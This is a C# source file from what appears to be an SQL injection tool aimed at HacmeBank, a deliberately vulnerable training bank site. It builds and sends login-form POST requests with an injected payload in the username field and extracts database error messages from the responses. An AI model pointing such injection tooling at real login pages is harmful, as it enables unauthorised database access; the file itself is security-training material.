using System;
using System.Collections.Generic;
using System.Text;
using System.Configuration;
using System.Windows.Forms;
using System.IO;
using System.Net;

namespace SqlInjection_DatabaseExplorer
{
    class httpRequests
    {
        public static string executerequestAndGetNormalizedPayloadErrorMessage(string strPayload)
        {
            //string strRequestWithPayload = executePayload.GenerateExploitHttpRequest(strPayload);
            //string strRequestHttpContent = executeSyncRequest(ConfigurationSettings.AppSettings["IP"], Int32.Parse(ConfigurationSettings.AppSettings["Port"]), strRequestWithPayload, ref bRawHttpCancelRequest);						

            String sUrl = getPayload.getURLToPlacePayload();
            String strPostData = getPayload.getPostDataWithPayload(strPayload);

            string strRequestHttpContent = httpRequests.getWebPage_POST(sUrl, strPostData);


            string strErrorMessage = stringFilters.extractErrorMessageFromHttpContent(strRequestHttpContent);
            return strErrorMessage;
        }

        

        private string __GenerateExploitHttpRequest(string strPayload)
        {
            String strBaseRequest = "POST /HacmeBank_v2_Website/aspx/login.aspx HTTP/1.0" + Environment.NewLine +
                "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*" + Environment.NewLine +
                "Referer: http://" + ConfigurationSettings.AppSettings["IP"] + "/HacmeBank_v2_Website/aspx/login.aspx" + Environment.NewLine +
                "Accept-Language: en-us" + Environment.NewLine +
                "Content-Type: application/x-www-form-urlencoded" + Environment.NewLine +
                "Accept-Encoding: gzip, deflate" + Environment.NewLine +
                "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.1.4322)" + Environment.NewLine +
                "Proxy-Connection: Keep-Alive" + Environment.NewLine +
                "Pragma: no-cache" + Environment.NewLine +
                "Host: " + ConfigurationSettings.AppSettings["IP"] + Environment.NewLine;

            string strViewState = getPayload.getViewStateOfLocalServer();
            if ("" == strViewState)
                MessageBox.Show(@"Error: Could not get Viewstate for this server (make sure the hacmebank website is located at http://" + ConfigurationSettings.AppSettings["IP"] + ":" + ConfigurationSettings.AppSettings["Port"] + "/HacmeBank_v2_Website/aspx/login.aspx ");
            string strPostData = "__VIEWSTATE=" + strViewState + "&txtUserName=jv" + strPayload + "&txtPassword=jv789&btnSubmit=Submit&__EVENTVALIDATION=%2FwEWBAKt9uW%2FDQKl1bKzCQK1qbSRCwLCi9reA%2F%2BgC4WsK%2BZY7DIbgqWC5CsMd6ts";

            string strHttpRequest = strBaseRequest +
                                    "Content-Length: " + strPostData.Length +
                                    Environment.NewLine + Environment.NewLine +
                                    strPostData + Environment.NewLine;
            return strHttpRequest;
        }


        public static string getWebPage(string webPageToFetch)
        {
            try
            {
                Stream streamOfHttpResponse;

                WebRequest objWebRequest = WebRequest.Create(webPageToFetch);
                //      WebProxy wpWebProxy = new WebProxy("127.0.0.1", 8888);
                //      objWebRequest.Proxy = wpWebProxy;
                WebResponse objWebResponse = objWebRequest.GetResponse();

                streamOfHttpResponse = objWebResponse.GetResponseStream();
                StreamReader objStreamReader = new StreamReader(streamOfHttpResponse);
                string httpResponse = objStreamReader.ReadToEnd();
                return httpResponse;
            }
            catch (Exception Ex)
            {
                return Ex.Message;
            }
        }

        public static string getWebPage_POST(string webPageToFetch, String sPostData)
        {
            try
            {
                Stream streamOfHttpResponse;

                WebRequest wrWebRequest = WebRequest.Create(webPageToFetch);
                wrWebRequest.Method = "POST";
                wrWebRequest.ContentType = "application/x-www-form-urlencoded";
                Stream swRequest = wrWebRequest.GetRequestStream();
                swRequest.Write(ASCIIEncoding.ASCII.GetBytes(sPostData), 0, sPostData.Length);
                swRequest.Close();
                WebResponse wrWebResponse = wrWebRequest.GetResponse();

                streamOfHttpResponse = wrWebResponse.GetResponseStream();
                StreamReader objStreamReader = new StreamReader(streamOfHttpResponse);
                string sHttpResponse = objStreamReader.ReadToEnd();
                return sHttpResponse;
            }
            catch (Exception Ex)
            {
                return Ex.Message;
            }
        }
    }
}
